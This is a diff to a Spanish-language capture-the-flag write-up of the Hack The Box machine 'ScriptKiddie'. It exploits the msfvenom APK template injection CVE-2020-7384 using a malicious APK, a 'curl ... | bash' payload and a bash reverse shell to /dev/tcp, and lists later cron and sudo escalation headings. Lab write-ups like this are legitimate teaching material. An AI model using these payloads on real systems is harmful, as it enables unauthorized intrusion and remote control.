@@ -25,7 +25,7 @@ layout:
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con `nmap` para ver los puertos que están expuestos en la máquina **`ScriptKiddie`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.226 -oG allPorts
@@ -50,7 +50,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.92 seconds
            Raw packets sent: 65811 (2.896MB) | Rcvd: 65538 (2.622MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -63,7 +63,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.92 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Werkzeug` y el servicio`SSH`.
 
 ```bash
 ❯ nmap -sCV -p22,5000 10.10.10.226 -A -oN targeted -oX targetedXML
@@ -97,7 +97,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 9.39 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -106,52 +106,70 @@ Nmap done: 1 IP address (1 host up) scanned in 9.39 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
-
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/5268_vmware_SkIcv2odJc.png" alt=""><figcaption></figcaption></figure>
 
+## Web Enumeration
 
+Realizaremos a través de la herramienta de `whatweb` un reconocimiento inicial de las tecnologías que utiliza la aplicación web.
 
 ```bash
 ❯ whatweb -a 3 http://10.10.10.226:5000
 http://10.10.10.226:5000 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.16.1 Python/3.8.5], IP[10.10.10.226], Python[3.8.5], Title[k1d'5 h4ck3r t00l5], Werkzeug[0.16.1]
 ```
 
+Accedemos a http://10.10.10.226:5000 y nos encontramos con la siguiente página web. Al parecer, esta aplicación web ofrece diversas `tools` de `pentesting`, entre las cuales podemos observar los siguientes tres apartados.
 
-
-
+* Nmap --> Permite realizar un escaneo de los 100 puertos TCP más comunes de la dirección IP que se le proporcione.
+* Payloads --> Permite utilizar `msfvenom` para crear un `meterpreter bin` para generar una RevShell.
+* Sploits --> Permite realizar una consulta a través de la herramienta `searchsploit` en busca de vulnerabilidades ya conocidas (CVE).
 
 <figure><img src="../../.gitbook/assets/5269_vmware_e8rEYYA1G5.png" alt=""><figcaption></figcaption></figure>
 
+Realizaremos una enumeración de las diferentes funcionalidades que disponemos, para poder encontrar algún vector de entrada, etc.
 
+En el primer caso, indicamos la dirección IP `127.0.0.1` para que la herramienta se intente realizar un escaneo al mismo servidor para poder localizar algún puerto interno que se encontrase abierto.
+
+En el resultado obtenido, se nos muestra los mismos puertos los cuales habíamos localizado en el reconocimiento inicial con`Nmap`.
 
 <figure><img src="../../.gitbook/assets/imagen (455).png" alt=""><figcaption></figcaption></figure>
 
-
+Por otro lado, también probamos de intentar realizar un `Command Injection` de diversas maneras, a través de `;` `&&` `||`, etc. Pero tampoco obtuvimos resultados.
 
 <figure><img src="../../.gitbook/assets/imagen (456).png" alt=""><figcaption></figcaption></figure>
 
-
+A continuación, probamos la siguiente `tool` que ofrecía la aplicación web. En este primer intento para comprobar cómo funcionaba, se le especificó valores normales y comprobamos el resultado obtenido en la respuesta del servidor.  También ofrece una opción de `template file`, que revisaremos más adelante si podemos hacer un `File Upload` o intentar realizar otras acciones.
 
 <figure><img src="../../.gitbook/assets/imagen (457).png" alt=""><figcaption></figcaption></figure>
 
-
+Intentamos realizar nuevamente un `Command Injection`, pero no logramos obtener resultados.
 
 <figure><img src="../../.gitbook/assets/imagen (458).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Para finalizar, realizamos una comprobación de la `tool` llamada `sploits` la cual se basa en la herramienta `searchsploit` para lograr encontrar vulnerabilidades ya reportadas. Realizamos una búsqueda simple y comprobamos que se nos mostraba el resultado de las vulnerabilidades encontradas en la respuesta por parte del servidor.
 
 <figure><img src="../../.gitbook/assets/imagen (459).png" alt=""><figcaption></figcaption></figure>
 
+En este caso, al intentar realizar el `Command Injection`, se nos indicaba un mensaje indicando `stop hacking me - will hack you back`. Dando a entender, que paremos de intentar hackear la aplicación web o nos realizaría lo mismo.
 
+Dado que en este punto, se nos mostró este mensaje de error inusual que en los anteriores funcionalidades no nos apareció, decidimos profundizar más en intentar realizar un `Bypass` al `Command Injection`, pero no logramos obtener resultados.
 
 <figure><img src="../../.gitbook/assets/imagen (460).png" alt=""><figcaption></figcaption></figure>
 
+## Initial Access
 
+### Msfvenom APK Template Exploitation - Command Injection (CVE-2020-7384)
+
+Dado que no disponemos de mucha información sobre la página web y revisando diferentes maneras de intentar realizar un `Command Injection` los cuales no obtuvimos resultado, decidimos realizar lo siguiente.
+
+En la herramienta llamada `payloads` de la aplicación web, sabemos que utiliza la herramienta de `msfvenom` de `Metasploit`. Desconocemos la versión exacta de la herramienta, pero intentamos buscar a ver si había alguna vulnerabilidad en el cual nos encontramos con el siguiente `CVE-2020-7384`.&#x20;
+
+No perderíamos nada intentando realizar la explotación de la siguiente vulnerabilidad, debido que tampoco tenemos gran cosa para avanzar y ganar acceso al sistema, así que nos pondremos manos a la obra.
+
+{% hint style="info" %}
+`Msfvenom` es una herramienta de línea de comandos que se utiliza para generar payloads personalizados para una amplia variedad de sistemas operativos y arquitecturas.
+{% endhint %}
 
 ```bash
 ❯ searchsploit msfvenom
@@ -163,7 +181,13 @@ Metasploit Framework 6.0.11 - msfvenom APK template command injection           
 Shellcodes: No Results
 ```
 
+{% hint style="danger" %}
+La trama msfvenom en Metasploit de Rapid7 maneja archivos APK de una manera que permite a un usuario malicioso crear y publicar un archivo que ejecutaría comandos arbitrarios en la máquina de la víctima
+{% endhint %}
 
+{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2020-7384" %}
+
+Nos copiaremos a nuestro directorio actual de trabajo el exploit que nos muestra disponible la herramienta de `searchsploit`.
 
 ```bash
 ❯ searchsploit -m multiple/local/49491.py
@@ -179,7 +203,7 @@ Copied to: /home/kali/Desktop/HackTheBox/Linux/ScriptKiddie/ScriptKiddie/49491.p
 ❯ mv 49491.py CVE-2020-7384.py
 ```
 
-
+Modificaremos el script de Python para realizar el `Command Injection`. En este caso, para verificar que la aplicación web es vulnerable, lo que inyectaremos es un comando para que realice una petición `cURL` a un recurso que no existe para comprobar en nuestro servidor web que se ha realizado dicha petición. En caso de que nos llegase un `GET`, confirmaríamos que existe el `Command Injection`.
 
 {% code title="CVE-2020-7384.py" %}
 ```python
@@ -201,7 +225,7 @@ payload = 'curl http://10.10.14.2/gzzcoo'
 ```
 {% endcode %}
 
-
+Una vez tengamos el exploit modificado, lo ejecutaremos y comprobaremos que se nos genera un archivo `APK` malicioso. Para realizar la explotación, la víctima deberá ejecutar `msfvenom` con nuestro archivo `APK` malicioso.
 
 ```bash
 ❯ python3 CVE-2020-7384.py
@@ -225,24 +249,22 @@ Do: msfvenom -x /tmp/tmp1drlqg5d/evil.apk -p android/meterpreter/reverse_tcp LHO
 .rw-rw-r-- kali kali 1.9 KB Sun Mar  2 17:11:37 2025  /tmp/tmp1drlqg5d/evil.apk
 ```
 
-
+Levantaremos un servidor web con Python para realizar la prueba de la confirmación de la vulnerabilidad.
 
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+En el apartado de `payloads` dejaremos la siguiente configuración y en `template file` subiremos el `evil.apk` que contiene nuestre payload malicioso. Le daremos a la opción de `generate`.
 
 <figure><img src="../../.gitbook/assets/5276_vmware_JPoM0pnDYm.png" alt=""><figcaption></figcaption></figure>
 
-
+Al darle a dicha opción, en la respuesta por parte del servidor se nos muestra el siguiente mensaje de error.
 
 <figure><img src="../../.gitbook/assets/5277_vmware_oR6bJIy4GF.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Pero por parte nuestra, en nuestro servidor web se ha recibido una petición por `GET` desde la dirección IP víctima. Con lo cual, hemos confirmado que la versión que utiliza la aplicación web es `Msfvenom 6.0.11` la cual es vulnerable a `Command Injection`, además hemos podido confirmar la explotación de la vulnerabilidad.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -251,15 +273,16 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.226 - - [02/Mar/2025 17:14:20] "GET /gzzcoo HTTP/1.1" 404 -
 ```
 
-
+Con lo cual, el siguiente paso será lograr obtener acceso al sistema. Para ello, crearemos un script en `Bash` que realice la Reverse Shell. Este script lo deberemos compartir a través de un servidor web.
 
 ```bash
 ❯ echo '#!/bin/bash \n/bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"' > shell.sh
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Editaremos nuevamente el exploit y le indicaremos que realice una petición con `cURL` sobre nuestro script de `Bash` y se ejecute en una `bash` el script que estamos compartiendo.
 
 {% code title="CVE-2020-7384.py" %}
 ```python
@@ -281,14 +304,14 @@ payload = 'curl http://10.10.14.2/shell.sh|bash'
 ```
 {% endcode %}
 
-
+En una nueva terminal, nos pondremos en escucha con `nc` para recibir la Reverse Shell.
 
 ```basic
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Utilizaremos nuevamente el exploit para generar un nuevo archivo `APK` malicioso.
 
 ```bash
 ❯ python3 CVE-2020-7384.py
@@ -312,11 +335,11 @@ Do: msfvenom -x /tmp/tmp7fwr95xx/evil.apk -p android/meterpreter/reverse_tcp LHO
 .rw-rw-r-- kali kali 1.9 KB Sun Mar  2 17:19:44 2025  /tmp/tmp7fwr95xx/evil.apk
 ```
 
-
+Realizaremos los mismos pasos y subiremos este nuevo archivo `APK` malicioso que hemos generado en el paso anterior.
 
 <figure><img src="../../.gitbook/assets/5281_vmware_LJyAgqDbrR.png" alt=""><figcaption></figcaption></figure>
 
-
+Al utilizar la herramienta vulnerable, finalmente comprobamos que hemos ganado acceso al sistema a través del usuario `kid` y podemos visualizar la flag **user.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -325,10 +348,10 @@ connect to [10.10.14.2] from (UNKNOWN) [10.10.10.226] 48646
 bash: cannot set terminal process group (891): Inappropriate ioctl for device
 bash: no job control in this shell
 kid@scriptkiddie:~/html$ cat /home/kid/user.txt
-16c4a15c6103d2cac9a2b6b4c5e224aa
+16c4a***************************
 ```
 
-
+Al obtener la reverse shell, mejoramos la calidad de la shell con los siguientes pasos para obtener una TTY interactiva.
 
 ```bash
 kid@scriptkiddie:~/html$ script /dev/null -c bash
@@ -343,6 +366,12 @@ kid@scriptkiddie:~/html$ export TERM=xterm
 kid@scriptkiddie:~/html$ export SHELL=bash
 kid@scriptkiddie:~/html$ stty rows 46 columns 230
 ```
+
+## Pivoting to pwn
+
+
+
+### Abusing Logs + Cron Jonb (Command Injection)
 
 
 
@@ -505,6 +534,10 @@ pwn@scriptkiddie:~$ export TERM=xterm
 pwn@scriptkiddie:~$ export SHELL=bash
 pwn@scriptkiddie:~$ stty rows 46 columns 230
 ```
+
+## Privilege Escalation
+
+### Abusing sudoers privilege (msfconsole)
 
 
 
